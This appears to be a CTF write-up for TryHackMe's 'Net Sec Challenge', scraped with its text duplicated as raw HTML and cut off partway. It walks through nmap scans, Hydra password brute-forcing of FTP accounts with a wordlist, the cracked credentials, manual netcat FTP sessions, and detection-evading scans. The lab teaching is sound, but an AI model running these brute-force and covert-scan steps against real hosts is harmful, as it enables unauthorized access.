(Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Unix\n\nHost script results:\n|_clock-skew: -1s\n| nbstat: NetBIOS name: NETSEC-CHALLENG, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)\n| Names:\n|   NETSEC-CHALLENG&lt;00&gt;  Flags: &lt;unique&gt;&lt;active&gt;\n|   NETSEC-CHALLENG&lt;03&gt;  Flags: &lt;unique&gt;&lt;active&gt;\n|   NETSEC-CHALLENG&lt;20&gt;  Flags: &lt;unique&gt;&lt;active&gt;\n|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;\n|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;\n| smb2-time: \n|   date: 2022-04-04T03:07:53\n|_  start_date: N/A\n| smb2-security-mode: \n|   3.1.1: \n|_    Message signing enabled but not required\n\nTRACEROUTE (using port 1025/tcp)\nHOP RTT       ADDRESS\n1   47.27 ms  10.13.0.1\n2   ... 3\n4   222.58 ms 10.10.152.115\n\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at nmap.org/submit/ .\n# Nmap done at Sun Apr  3 21:08:01 2022 -- 1 IP address (1 host up) scanned in 1197.32 seconds\n\nThis enables us to answer a set of questions immediately, but after this things get harder…\nWe start off by attempting to brute force the password for eddie or quinn using Hydra. To do this, we’re going to run two Hydra tasks in parallel.\n# Hydra task to break eddie&#039;s password.\n#\nhydra -v -f -t 10 -s 10021 -l eddie \\\n      -P ~/.local/share/red-team/wordlists/rockyou.txt \\\n         10.10.152.115 ftp\n \n# Hydra task to break quinn&#039;s password.\n#\nhydra -v -f -t 10 -s 10021 -l quinn \\\n      -P ~/.local/share/red-team/wordlists/rockyou.txt \\\n         10.10.152.115 ftp\nThese quickly return the results eddie:jordan and quinn:andrea. Let’s try to use nc -nv 10.10.152.115 10021 to log into eddie’s account.\n(UNKNOWN) [10.10.152.115] 10021 (?) open\n220 (vsFTPd 3.0.3)\nUSER eddie\n331 Please specify the password.\nPASS jordan\n230 Login successful.\n425 Use PORT or PASV first.\nPASV\n227 Entering Passive Mode (10,10,152,115,119,101).\nLIST\n150 Here comes the directory listing.\n226 Directory send OK.\nQUIT\n221 Goodbye.\nThe trick here is that the FTP passive mode response returns (o1,o2,o3,o4,p1,p2), where o1 – o4 are the four octets of the server’s IP address (10.10.152.115), and p1 – p2 are the high + low bytes of the port number to connect to, (256 × p1) + p2. Thus, after entering passive mode we can catch the reply using a second netcat instance, nc -nv 10.10.152.115 30565. We start this before entering the LIST command, revealing that eddie has access to no files.\nLet’s have the same conversation for quinn.\n(UNKNOWN) [10.10.152.115] 10021 (?) open\n220 (vsFTPd 3.0.3)\nUSER quinn\n331 Please specify the password.\nPASS andrea\n230 Login successful.\nPASV\n227 Entering Passive Mode (10,10,152,115,120,34).\nLIST\n150 Here comes the directory listing.\n226 Directory send OK.\nPASV\n227 Entering Passive Mode (10,10,152,115,117,85).\nRETR ftp_flag.txt\n150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).\n226 Transfer complete.\nQUIT\n221 Goodbye.\nFor FTP active mode we need to open two auxiliary netcat sessions. The first, nc -nv 10.10.152.115 30754, catches the LIST command, which reveals that quinn has access to an ftp_flag.txt file. The second, nc -nv 10.10.152.115 30037, catches the contents of that file after issuing the RETR command. This is the answer to our penultimate challenge.\nFor the final challenge, we go to http://10.10.152.115:8080. The challenge is to scan 10.10.152.115 “as covertly as possible”. I’m not really willing to wait 7 months for a scan, but I’ll bet that all we need to do is use -T1 and drop -A.\nsudo nmap -v -Pn -n -T1 -p- 10.10.152.115\nWell, that didn’t work — “71% chance of scan being detected” and we’re nowhere near done. That, and the machine expired without me even noticing.\nNew target IP is 10.10.34.244.\nMaybe speed doesn’t matter here? Let’s try a scan that shouldn’t even look like a connection — an ACK scan — but at a more “normal” rate.\nsudo nmap -v -Pn -n -T4 -sA -p- 10.10.34.244\nWell, that resulted in an almost immediate flag. Switching to -T2 for the timing here also incremented things quite quickly.\nWhat about a null scan? That might actually get me more information than an ACK scan, but should elicit any response from open ports.\nsudo nmap -v -Pn -n -T4 -sN -p- 10.10.34.244\n“Null scan” is apparently the right answer, as the challenge provided the flag almost immediately (which doesn’t actually make any sense, but whatever…).\nElapsed Time: 2 h 31 min","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/netsecchallenge&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;“Net Sec Challenge” on TryHackMe&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;This CTF is just a series of questions. All should be solvable using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt;, telnet, and &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Hydra&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hydra&quot;&gt;Hydra&lt;/a&gt;… Though I’m going to substitute &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; for telnet. However, I’m sticking to the spirit of things, and will only use those three tools.&lt;/p&gt;\n&lt;p&gt;The target machine is 10.10.152.115.&lt;/p&gt;\n&lt;p&gt;We’ll start off with a full &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt; scan:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -oN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; net-sec-challenge&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --reason&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;          -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.152.115&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Results:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Sun Apr  3 20:48:04 2022 as: nmap -v -oN net-sec-challenge -Pn -A --reason -T4 -p- 10.10.152.115\nIncreasing send delay for 10.10.152.115 from 0 to 5 due to 909 out of 2271 dropped probes since last increase.\nIncreasing send delay for 10.10.152.115 from 5 to 10 due to 11 out of 15 dropped probes since last increase.\nNmap scan report for 10.10.152.115\nHost is up, received user-set (0.19s latency).\nNot shown: 65529 closed tcp ports (reset)\nPORT      STATE SERVICE     REASON         VERSION\n22/tcp    open  ssh         syn-ack ttl 61 (protocol 2.0)\n| ssh-hostkey: \n|   3072 da:5f:69:e2:11:1f:7c:66:80:89:61:54:e8:7b:16:f3 (RSA)\n|   256 3f:8c:09:46:ab:1c:df:d7:35:83:cf:6d:6e:17:7e:1c (ECDSA)\n|_  256 ed:a9:3a:aa:4c:6b:16:e6:0d:43:75:46:fb:33:b2:29 (ED25519)\n| fingerprint-strings: \n|   NULL: \n|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}\n80/tcp    open  http        syn-ack ttl 61 lighttpd\n|_http-server-header: lighttpd THM{web_server_25352}\n| http-methods: \n|_  Supported Methods: OPTIONS GET HEAD POST\n|_http-title: Hello, world!\n139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2\n445/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2\n8080/tcp  open  http        syn-ack ttl 61 Node.js (Express middleware)\n|_http-title: Site doesn&#039;t have a title (text/html; charset=utf-8).\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n10021/tcp open  ftp         syn-ack ttl 61 vsftpd 3.0.3\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port22-TCP:V=7.92%I=7%D=4/3%Time=624A60E5%P=x86_64-pc-linux-gnu%r(NULL,\nSF:29,&quot;SSH-2\\.0-OpenSSH_8\\.2p1 THM{946219583339}\n&quot;);\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.92%E=4%D=4/3%OT=22%CT=1%CU=32245%PV=Y%DS=4%DC=T%G=Y%TM=624A6111\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11\nOS:NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(\nOS:R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nUptime guess: 12.801 days (since Tue Mar 22 01:54:39 2022)\nNetwork Distance: 4 hops\nTCP Sequence Prediction: Difficulty=260 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Unix\n\nHost script results:\n|_clock-skew: -1s\n| nbstat: NetBIOS name: NETSEC-CHALLENG, NetBIOS user: &amp;#x3C;unknown&gt;, NetBIOS MAC: &amp;#x3C;unknown&gt; (unknown)\n| Names:\n|   NETSEC-CHALLENG&amp;#x3C;00&gt;  Flags: &amp;#x3C;unique&gt;&amp;#x3C;active&gt;\n|   NETSEC-CHALLENG&amp;#x3C;03&gt;  Flags: &amp;#x3C;unique&gt;&amp;#x3C;active&gt;\n|   NETSEC-CHALLENG&amp;#x3C;20&gt;  Flags: &amp;#x3C;unique&gt;&amp;#x3C;active&gt;\n|   WORKGROUP&amp;#x3C;00&gt;        Flags: &amp;#x3C;group&gt;&amp;#x3C;active&gt;\n|_  WORKGROUP&amp;#x3C;1e&gt;        Flags: &amp;#x3C;group&gt;&amp;#x3C;active&gt;\n| smb2-time: \n|   date: 2022-04-04T03:07:53\n|_  start_date: N/A\n| smb2-security-mode: \n|   3.1.1: \n|_    Message signing enabled but not required\n\nTRACEROUTE (using port 1025/tcp)\nHOP RTT       ADDRESS\n1   47.27 ms  10.13.0.1\n2   ... 3\n4   222.58 ms 10.10.152.115\n\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Sun Apr  3 21:08:01 2022 -- 1 IP address (1 host up) scanned in 1197.32 seconds\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;This enables us to answer a set of questions immediately, but after this things get harder…&lt;/p&gt;\n&lt;p&gt;We start off by attempting to brute force the password for eddie or quinn using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Hydra&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hydra&quot;&gt;Hydra&lt;/a&gt;. To do this, we’re going to run two &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Hydra&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hydra&quot;&gt;Hydra&lt;/a&gt; tasks in parallel.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Hydra task to break eddie&#039;s password.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;hydra&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10021&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; eddie&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;      -P&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ~/.local/share/red-team/wordlists/rockyou.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;         10.10.152.115&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ftp&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Hydra task to break quinn&#039;s password.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;hydra&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10021&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; quinn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;      -P&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ~/.local/share/red-team/wordlists/rockyou.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;         10.10.152.115&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ftp&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;These quickly return the results eddie:jordan and quinn:andrea. Let’s try to use &lt;code&gt;nc -nv 10.10.152.115 10021&lt;/code&gt; to &lt;a href=&quot;https://www.serv-u.com/resource/tutorial/quit-user-abor-acct-syst-xdel-ftp-command&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;log into&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; eddie’s account.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;ftp&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;ftp&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;(UNKNOWN) [10.10.152.115] 10021 (?) open&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;220 (vsFTPd 3.0.3)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;USER eddie&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;331 Please specify the password.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;PASS jordan&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;230 Login successful.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;425 Use PORT or PASV first.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;PASV&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;227 Entering Passive Mode (10,10,152,115,119,101).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;LIST&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;150 Here comes the directory listing.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;226 Directory send OK.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;QUIT&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;221 Goodbye.&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The trick here is that the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/FTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/FTP&quot;&gt;FTP&lt;/a&gt; passive mode response returns (o1,o2,o3,o4,p1,p2), where o1 – o4 are the four octets of the server’s IP address (10.10.152.115), and p1 – p2 are the high + low bytes of the port number to connect to, (256 × p1) + p2. Thus, &lt;a href=&quot;https://stackoverflow.com/questions/50324402/how-to-list-ftp-directories-using-telnet#comment126707507_50324402&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;after entering passive mode we can catch the reply using a second netcat instance&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, &lt;code&gt;nc -nv 10.10.152.115 30565&lt;/code&gt;. We start this &lt;em&gt;before&lt;/em&gt; entering the &lt;a href=&quot;https://www.serv-u.com/resource/tutorial/appe-stor-stou-retr-list-mlsd-mlst-ftp-command&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;LIST&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; command, revealing that eddie has access to no files.&lt;/p&gt;\n&lt;p&gt;Let’s have the same conversation for quinn.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;ftp&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;ftp&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;(UNKNOWN) [10.10.152.115] 10021 (?) open&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;220 (vsFTPd 3.0.3)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;USER quinn&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;331 Please specify the password.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;PASS andrea&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;230 Login successful.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;PASV&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;227 Entering Passive Mode (10,10,152,115,120,34).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;LIST&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;150 Here comes the directory listing.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;226 Directory send OK.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;PASV&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;227 Entering Passive Mode (10,10,152,115,117,85).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;RETR ftp_flag.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;226 Transfer complete.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;QUIT&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;221 Goodbye.&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;For &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/FTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/FTP&quot;&gt;FTP&lt;/a&gt; active mode we need to open &lt;em&gt;two&lt;/em&gt; auxiliary &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; sessions. The first, &lt;code&gt;nc -nv 10.10.152.115 30754&lt;/code&gt;, catches the LIST command, which reveals that quinn has access to an &lt;code&gt;ftp_flag.txt&lt;/code&gt; file. The second, &lt;code&gt;nc -nv 10.10.152.115 30037&lt;/code&gt;, catches the contents of that file after issuing the RETR command. This is the answer to our penultimate challenge.&lt;/p&gt;\n&lt;p&gt;For the final challenge, we go to &lt;code&gt;http://10.10.152.115:8080&lt;/code&gt;. The challenge is to scan 10.10.152.115 “as covertly as possible”. I’m not really willing to wait 7 months for a scan, but I’ll bet that all we need to do is use &lt;code&gt;-T1&lt;/code&gt; and drop &lt;code&gt;-A&lt;/code&gt;.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -T1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.152.115&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Well, that didn’t work — “71% chance of scan being detected” and we’re nowhere near done. That, and the machine expired without me even 